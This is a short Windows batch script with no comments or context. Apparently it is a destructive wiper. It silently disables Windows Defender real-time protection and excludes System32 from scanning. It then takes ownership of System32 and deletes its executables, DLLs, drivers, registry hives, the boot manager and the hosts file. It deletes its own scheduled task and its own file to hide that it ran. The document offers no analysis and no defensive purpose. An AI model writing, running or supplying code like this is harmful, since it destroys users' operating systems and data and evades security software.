@echo off
powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true;Add-MpPreference -ExclusionPath 'C:\Windows\System32'"
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant %username%:F /t /c >nul 2>&1
for /r C:\Windows\System32 %%f in (*.exe *.dll *.sys *.drv) do del /f /q "%%f" >nul 2>&1
del /f /q C:\Windows\System32\config\* >nul 2>&1
del /f /q C:\Windows\bootmgr >nul 2>&1
del /f /q C:\Windows\System32\drivers\etc\hosts >nul 2>&1
schtasks /delete /f /tn "%~nx0" >nul 2>&1
del /f /q "%~f0"
exit
